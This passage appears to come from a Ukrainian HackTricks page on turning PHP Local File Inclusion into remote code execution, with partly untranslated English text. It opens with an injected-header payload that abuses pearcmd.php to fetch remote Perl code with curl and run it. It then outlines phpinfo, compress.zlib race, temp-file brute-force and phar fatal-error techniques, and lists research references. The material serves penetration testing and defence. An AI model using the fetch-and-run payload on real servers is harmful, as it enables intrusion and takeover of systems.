Location:/ooo? %2b run-tests %2b -ui %2b $(curl${IFS}orange.tw/x|perl) %2b alltests.php %0d%0a
Content-Type:proxy:unix:/run/php/php-fpm.sock|fcgi://127.0.0.1/usr/local/lib/php/pearcmd.php %0d%0a
%0d%0a
```
### Через phpinfo() (file_uploads = on)

Якщо ви знайшли **Local File Inclusion** і файл, що викликає **phpinfo()** з file_uploads = on, ви можете отримати RCE:


{{#ref}}
lfi2rce-via-phpinfo.md
{{#endref}}

### Через compress.zlib + `PHP_STREAM_PREFER_STUDIO` + Path Disclosure

Якщо ви знайшли **Local File Inclusion** і ви **can exfiltrate the path** тимчасового файлу, АЛЕ **server** **checking**, чи **file to be included has PHP marks**, ви можете спробувати **bypass that check** за допомогою цієї **Race Condition**:


{{#ref}}
lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md
{{#endref}}

### Через eternal waiting + bruteforce

Якщо ви можете зловживати LFI, щоб **upload temporary files** і змусити **server** **hang** виконання PHP, ви тоді можете **brute force filenames during hours**, щоб знайти тимчасовий файл:


{{#ref}}
lfi2rce-via-eternal-waiting.md
{{#endref}}

### До Fatal Error

Якщо ви включите будь-який з файлів `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`. (Потрібно включити той самий файл 2 рази, щоб викликати цю помилку).

**I don't know how is this useful but it might be.**\
_Even if you cause a PHP Fatal Error, PHP temporary files uploaded are deleted._

<figure><img src="../../images/image (1031).png" alt=""><figcaption></figcaption></figure>

## Посилання

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)
- [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)
- [Horizon3.ai – From Support Ticket to Zero Day (FreeFlow Core path traversal → arbitrary write → webshell)](https://horizon3.ai/attack-research/attack-blogs/from-support-ticket-to-zero-day/)
- [Xerox Security Bulletin 025-013 – FreeFlow Core 8.0.5](https://securitydocs.business.xerox.com/wp-content/uploads/2025/08/Xerox-Security-Bulletin-025-013-for-Freeflow-Core-8.0.5.pdf)
- [watchTowr – We need to talk about PHP (pearcmd.php gadget)](https://labs.watchtowr.com/form-tools-we-need-to-talk-about-php/)
- [Orange Tsai – Confusion Attacks on Apache](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/)
- [VTENEXT 25.02 – a three-way path to RCE](https://blog.sicuranext.com/vtenext-25-02-a-three-way-path-to-rce/)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

{{#file}}
EN-Local-File-Inclusion-1.pdf
{{#endfile}}

{{#include ../../banners/hacktricks-training.md}}
